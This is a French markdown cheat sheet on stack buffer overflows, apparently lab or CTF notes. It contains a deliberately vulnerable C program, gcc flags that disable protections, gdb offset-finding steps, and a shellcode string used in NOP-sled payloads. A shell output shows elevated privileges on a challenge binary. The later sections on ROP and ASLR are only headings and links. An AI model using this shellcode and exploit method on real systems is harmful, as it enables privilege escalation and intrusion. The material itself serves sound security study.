# Buffer overflow

## Tools

Plugin pour gdb : https://github.com/longld/peda

## Payloads

### dash
````
"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
````

</br>
## Simple buffer overflow : overwrite a stack variable

````
$ cat buffer_01.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
  char  tst=0;
  char name[10];

  strcpy(name, argv[1]);
  printf("Hello %s\n", name);
  if (tst=='Z') printf("Pwnd");
  return 0;
}
$ gcc -fno-stack-protector buffer_01.c -o buffer_01
$ buffer_01 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
````

</br>
## Execute stack payload : before ESP

Context:
- Executable stack
- No canary
- No Address Space Layout Randomization
=> Adresses are hard coded in elf

gcc -z execstack 


Detection à la louche de l'overflow en shell
````
$ for i in `seq 500 510`;do echo $i; ./vuln_basic $(python -c "print 'a'*$i;"); done
````

Detection fine de la position dans gdb
````
gdb
disassemble main
break *0x0804844e
gdb-peda$ run $(python -c "print 'a'*512+'bcdefghijklmnopqrst';")
Stopped reason: SIGSEGV
0x65646362 in ?? ()
=> bcde
gdb-peda$ x/520x $esp
````

On dispose de 512 octets. On va utiliser (512-48) NOP et une payload de 48 octets suivi d'une adresse 1234.
````
 run $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x01\x02\x03\x04";')
 ````
On vérifie que EIP vaut bien 4x3x2x1
On cherche avec x/520x $esp une adresse dans les nop
"bffffd50"
On l'inverse
"\x50\xfd\xff\xbf" 

On quitte gdb et on fait en shell
````
./vuln_basic  $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x50\xfd\xff\xbf";')
$ id
uid=1001(user) gid=1001(user) euid=1000(chall) groups=1001(user)
````

</br>
## Execute stack payload : after ESP


On se le refait mais avec la payload après EIP
````
./vuln_basic  $(python -c 'print "\x90"*(512)+"\xc8\xfd\xff\xbf"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";')
````

</br>
## Stack/Heap non executable -> return to LibC


</br>
## Hide LibC adresse ALSR 32 bits -> bruteforce search 



</br>
## Hide LibC adresse ALSR 64 bits -> information leak (format string vuln)


</br>
## LibC hidden -> Return Oriented Program (ROP)

https://github.com/0vercl0k/rp

</br>
## Randomize location of code -> Blind ROP

[http://www.scs.stanford.edu/brop/]












